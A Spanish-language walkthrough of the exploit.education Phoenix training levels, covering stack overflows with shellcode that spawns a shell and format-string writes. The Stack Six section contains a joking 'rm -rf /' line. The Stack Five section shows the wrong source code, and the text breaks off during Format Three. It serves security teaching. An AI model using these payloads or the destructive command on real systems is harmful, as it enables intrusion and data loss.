---

layout: default
title: "Phoenix-Exploit Education"
permalink: /Phoenix-EE/
---

# Phoenix-Exploit Education

**Todos los retos de esta pagina se extraen se la siguiente web**

Link: [https://exploit.education/phoenix/](https://exploit.education/phoenix/)

## Índice

  * [Stack Buffer Overflow](#stack-buffer-overflow)
      * [Stack Zero](#stack-zero)
      * [Stack One](#stack-one)
      * [Stack Two](#stack-two)
      * [Stack Three](#stack-three)
      * [Stack Four](#stack-four)
      * [Stack Five](#stack-five)
      * [Stack Six](#stack-six)
  * [Format String Overflow](#format-string-overflow)
      * [Format Zero](#format-zero)
      * [Format One](#format-one)
      * [Format Two](#format-two)
      * [Format Three](#format-three)
      * [Format Four](#format-four)
  * [Heap Overflow](#heap-overflow)
      * [Heap Zero](#heap-zero)
      * [Heap One](#heap-one)
      * [Heap Two](#heap-two)
      * [Heap Three](#heap-three)
  * [Net Overflow](#net-overflow)
      * [Net Zero](#net-zero)
      * [Net One](#net-one)
      * [Net Two](#net-two)
  * [Final Problem](#final-problem)
      * [Final Zero](#final-zero)
      * [Final One](#final-one)
      * [Final Two](#final-two)

# Stack Buffer Overflow

## Stack Zero

```c
/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Ejecutamos el programa para ver que nos dice

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'" | ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

Intentaremos cambiar el valor de **changeme** y para esto escribiremos muchas **A** para forzar el stack buffer overflow.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*100" | ./stack-zero  
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed
```

**NOTA: En los siguiente niveles veremos poco a poco como realizar un ataque de Stack Buffer Overflow, hasta el monento de ejecutar una shell.**

## Stack One

```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

Ejecutamos el programa para ver que nos dice:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one AAAA
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962
```

Como podemos ver, existe una estructura llamada **locals**. En el contexto de las estructuras, todos los elementos se ubican de manera continua, para de esta manera no perder tiempo y esfuerzo a la hora de acceder entre ellos. Por ello lo que haremos será exceder todos los 64 bytes del vector de caracteres **buffer**, y de esta manera alcanzar al elemento **changeme**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c "print 'A'*64+'BBBB'")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x42424242, we want 0x496c5962
```

Como puede ver, si funciona, porque **42424242** es **BBBB** en hexadecimal. Pero ahora necesitamos cambiar el valor de **changeme** a **0x496c5962**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c "print 'A'*64+'\x49\x6c\x59\x62'[::-1]")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Two

```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

Este ejercicio es parecido al anterior, solo que esta vez debemos de crear una variable de entorno con el nombre **ExploitEducation**,

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c "print 'A'*64+'BBBB'")
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x42424242, we want 0x0d0a090a
```

Entonces, actualizaremos con el valor que requiere.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c "print 'A'*64+'\x0d\x0a\x09\x0a'[::-1]")
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Three

```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

Como podemos ver el codigo es muy parecido solo que ahora nos encontramos con la funcion **complete_level** a donde debemos llegar, 

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*64+'BBBB'" | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x42424242
Segmentation fault
```

Ahora encontraremos cual es la direccion de memoria en donde se almacena la funcion **complete_level** usando el siguiente comando:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ objdump -t ./stack-three | grep complete_level
000000000040069d g     F .text	0000000000000018 complete_level
```

Entonces lo que haremos será reemplazar esos **42424242** por la direccion que apunta complete_level, **0040069d**

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*64+'\x00\x40\x06\x9d'[::-1]," | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0xa0040069d
Segmentation fault
```

Como podemos ver, al parecer agregó un **0a** al la direccion, esto ocurre por el salto de linea que tiene python al ejecutar el script. Entonces, lo que haremos será eliminar ese salto de linea con el comando **tr -d '\n'**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*64+'\x00\x40\x06\x9d'[::-1]" | tr -d '\n' | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Stack Four

```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

Ejecutando el programa obtenemos lo siguiente:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
```

Ahora vemos que nos muestra una direccion y si vemos el codigo esta es a direccion de retorno de la funcion **start_level**, lo que debemos hacer es sobrescribirla por la direccion de la funcion **complete_level**, primero tenemos que buscar cual es la direccion de la funcion **complete_level** y lo realizaremos con el siguiente comando:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ objdump -t ./stack-four | grep complete_level
000000000040061d g     F .text	0000000000000018 complete_level
```

Entonces ahora, necesitamos saber cuantas **A** tenemos que escribir para que las siguiente 4 **B** escriban en la direccion de retorno.

```bash	
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*100+'BBBB'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x4141414141414141
Segmentation fault

user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*90+'BBBB'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x424242424141
Segmentation fault

user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*88+'BBBB'" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x42424242
Segmentation fault
```

Y justo dimos con que la cantidad es 88. Ahora lo que haremos será escribir en lugar de esos **42424242** reemplazarlos por **40061d**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'A'*88+'\x40\x06\x1d'[::-1]" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

**Nota: Como podemos ver si no escribimos el *\x00* en el print del python no necesitamos eliminar el salto de linea como lo hicimos en el ejemplo anterior. (Stack Three)**

## Stack Five

```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

Ingresaremos al radare para testear la longitud del padding.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ r2 -d ./stack-five 
Process with PID 627 started...
[0x7ffff7dc5d34]> dc
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
= attach 629 1
[0x4141414141414141]>
```

Como podemos ver la cantidad de A que ingresamos es suficiente para sobrescribir el EIP, probamos con un string menor.

```bash
[0x7ffff7d9021f]> doo
[0x7ffff7dc5d34]> dc
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
= attach 632 1
[0x004005cc]> 
```

Con esto vemos que todavia no sobrescribe el **EIP**. Así que debemos tantear hasta ver cuandos  **A** debemos elegir para escribir el RIP con lo que deseamos.

```bash
[0x7ffff7d9021f]> doo
[0x7ffff7dc5d34]> dc
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00004141 code=1 ret=0
= attach 636 1
[0x00004141]> 
```

Como podemos ver, entonces las ultimas dos **A** que estamos ingresando son las que escriben dos caracteres del **RIP**. Entonces revisaremos en python la logitud de esa cadena antes ingresada restandole dos **A**.

```bash
$ python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
136
```

Entonces sabemos que la logitud del padding será 136. Ahora debemos saber que nuestro payload final para ejecutar la shell esta compuesto por lo siguiente:

**Payload = PADDING + RIP + NOPS + SHELLCODE + NOPS**

Entonces, escribimos el siguiente script.

```python
#!/bin/python

payload ='A'*136
payload+='' #Aqui vamos a poner una direccion que realice un salto a rsp. (jmp rsp)
payload+='\x90'*20
payload+='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48'     #SHELLCODE
payload+='\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' #SHELLCODE
payload+='\x90'*20
```

Ahora, para que nuestro script esté completo, necesitamos obtener la direccion de memoria que realice un salto al RSP, y para esto entraremos en el radare y buscaremos lo siguiente.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ r2 -d ./stack-five 
Process with PID 596 started...
= attach 596 596
bin.baddr 0x00400000
USING 400000
Assuming filepath /opt/phoenix/amd64/stack-five
asm.bits 64
[0x7ffff7dc5d34]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x7ffff7dc5d34]> /a jmp rsp
Searching 2 bytes in [0x7ffff7d6b000-0x7ffff7dfb000]
hits: 5
0x7ffff7d71437 hit0_0 ffe4
0x7ffff7dde2ed hit0_1 ffe4
0x7ffff7de4f72 hit0_2 ffe4
0x7ffff7de5b0d hit0_3 ffe4
0x7ffff7df9133 hit0_4 ffe4
```

Ahora escogemos uno de los resultados del **jmp rsp**, el cual será **0x7ffff7d71437**. Entonces actualizando el script sería el siguiente:

```bash
#!/bin/python

payload ='A'*136
payload+='\x00\x00\x7f\xff\xf7\xd7\x14\x37'[::-1] #Tenemos que poner los 8 bytes estrictamente. LLenamos con \x00 si falta algunos.
payload+='\x90'*20
payload+='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48'     #SHELLCODE
payload+='\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' #SHELLCODE
payload+='\x90'*20

print(payload)
```

Corremos el archivo de python y lo guardamos en un archivo.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python /tmp/s5.py > /tmp/out.txt
```

Ahora ejecutamos el binario, ingresando por un pipe el contenido de **out.txt**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/out.txt | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
```

Como podemos ver, no funciona, esto es porque al enviar el texto con el cat al binario **stack-five**, se cierra la comunicacion. Así que, para que esto no ocurra, lo que haremos será agregarle un guion luego de especificar el archivo.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/out.txt - | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five
id
uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user)
```

Listo :D.

## Stack Six

	[ no me sale :c ]
	> rm -rf /
	u.u

# Format String Overflow

## Format Zero

```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.

Como podemos ver, exite una structura llamada **locals**. En el contexto de las estructuras, todos los elementos se ubican de manera continua, para de esta manera no perder tiempo y esfuerzo a la hora de acceder entre ellos. Por ello lo que haremos será exceder todos los 32 bytes del vector de caracteres **dest**, y de esta manera alcanzar al elemento **changeme**.

Ejecutando el siguiente comando:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%x'*32"| ./format-zero  
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Format One

```c
/*
 * phoenix/format-one, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * Why did the Tomato blush? It saw the salad dressing!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}
```

En este nivel, podemos ver que el codigo es muy parecido, solo que esta vez, verifica que el valor de **changeme** no solo cambie, sino que tenga un valor exacto, el cual es **0x45764f6c**. Entonces para esto realizaremos lo mismo pero al final excribiremos el valor hexadecimal deseado.

**Nota: Considere que tendrá que ingresar el valor en modo little endian.**

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x6c\x4f\x76\x45'" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!

#Tambien podemos poner en vez de '\x6c\x4f\x76\x45' como '\x45\x76\x4f\x6c'[::-1]

user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%32x'+'\x45\x76\x4f\x6c'[::-1]" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

## Format Two

```c
/*
 * phoenix/format-two, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * What kind of flower should never be put in a vase?
 * A cauliflower.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

Como podemos ver, ahora no contamos con estructuras, pero nos dicen que tenemos que cambiar el valor de la variable **changeme**. Así que empezaremos con obtener la direccion de memoria de la variable **chageme**, para nuestro programa con el siguiente comando:

```bash
user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-two | grep changeme
08049868 B changeme
```

Ahora escribimos **AAAA** seguido de una cantidad de **%x** para que el utimo numero que salga sea el hexadecimal del primer texto el cual seria el hexadecimal de **AAAA** el cual es **41414141**.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*12")
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAffffd89d.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89d.100.3e8.41414141.Better luck next time!
```

Entonces lo que haremos será quitar un **%x** y reemplazarlo por un **%n** y veremos lo que ocurre:

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*11+'%n'")
Welcome to phoenix/format-two, brought to you by https://exploit.education
Segmentation fault
```

Entonces como puede ver, nos encontramos con un **Segmentation fault**, lo cual nos dice que se ha encontrado una direccion invalida de memoria. Esto se debe a que esta intentando sobrescribir en la direccion **0x41414141** pero esta direccion es inválida. Entonces lo que haremos será insertar la direccion de memoria de la variable **changeme** (en modo little endian).

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print '\x08\x04\x98\x68'[::-1]+'%x.'*11+'%n'")
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd89e.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89e.100.3e8.Well done, the 'changeme' variable has been changed correctly!
```

Y como podemos ver, logramos sobrescribir el contenido de la variable **changeme**.

## Format Three

```c
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

Este nivel es parecido al anterior, solo que ahora nos piden que sobrescribamos la variable **changeme** con un valor en especifico. Así que empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuantos **%x** hay que agregar para que salgan nuestras **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-three | grep changeme
08049844 B changeme

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 41414141 
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme** (en modo little endian).

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 8049844 
Better luck next time - got 0x00000000, wanted 0x64457845!

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000045, wanted 0x64457845!
```

Como podemos ver, hemos escrito en el byte primero pero, nos faltan 3 bytes mas. Entonces ingresaremos en la parte de adelante las otras direcciones (de los siguientes 3 bytes) para ver cual es el resultado.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000051, wanted 0x64457845!
```

Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa entonces no tenemos que hacer exactamente esta resta, notamos que si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51 (considerando que son numeros en hexadecimal).

```bash
>>> int("145",16)-int("51",16) #Codigo en consola de python
244

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00000145, wanted 0x64457845!
```

Luego agregamos el siguiente %n para ver, como se encuentra nuestro segundo byte al sobrescribir.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00014545, wanted 0x64457845!
```

Ahora, realizamos lo mismo con el siguiente byte, lo cual seria 78-45.

```bash
>>> int("78",16)-int("45",16)
51

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
